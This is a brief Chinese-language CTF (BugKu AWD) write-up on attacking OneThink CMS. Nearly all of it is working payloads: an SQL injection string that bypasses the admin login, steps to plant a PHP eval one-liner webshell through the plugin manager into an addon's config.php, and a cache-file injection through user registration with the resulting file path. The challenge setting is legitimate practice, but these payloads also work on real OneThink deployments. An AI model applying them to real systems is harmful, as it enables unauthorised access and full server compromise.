# bugkuAWD-05-Onethink

## sql注入进后台

payload

```
username[]=like 1)and 1 in (2) union select 1,2,'',4,5,6,7,8,9,10,11%23&username[]=0&password=&verify=验证码
```

## 后台getshell

后台 > 插件管理, 新建test > 是否需要配置下面的框

```
<?php @eval($_POST[a]);?>
```

保存后扩展功能插件管理处会增加test插件信息 

在网站Addons目录下创建一个test文件夹，config.php内容就是写入的一句话木马 

## 用户注册反序列化漏洞

```
<?php
//000000000000a:3:{s:2:"u7";s:6:"111111";s:2:"u8";s:12:"
phpinfo();//";}
?>
```

访问缓存文件 `data/runtime/temp/2bb202459c30a1628513f40ab22fa01a.php`